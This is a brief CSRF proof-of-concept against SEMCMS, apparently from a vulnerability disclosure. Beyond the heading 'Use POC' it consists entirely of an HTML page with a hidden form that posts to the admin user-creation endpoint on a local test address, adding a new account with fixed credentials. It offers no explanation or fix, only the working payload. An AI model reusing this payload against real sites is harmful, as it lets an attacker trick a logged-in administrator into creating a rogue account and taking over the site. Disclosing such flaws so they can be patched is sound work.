# CSRF

Use POC：
```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.33.62.73:8080/admin/SEMCMS_User.php?Class=add&CF=user" method="POST">
      <input type="hidden" name="user&#95;name" value="123" />
      <input type="hidden" name="user&#95;admin" value="123123" />
      <input type="hidden" name="user&#95;ps" value="123123" />
      <input type="hidden" name="user&#95;tel" value="1111111" />
      <input type="hidden" name="user&#95;email" value="1231&#64;123&#46;com" />
      <input type="hidden" name="submit" value="å&#162;&#158;å&#138;&#160;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
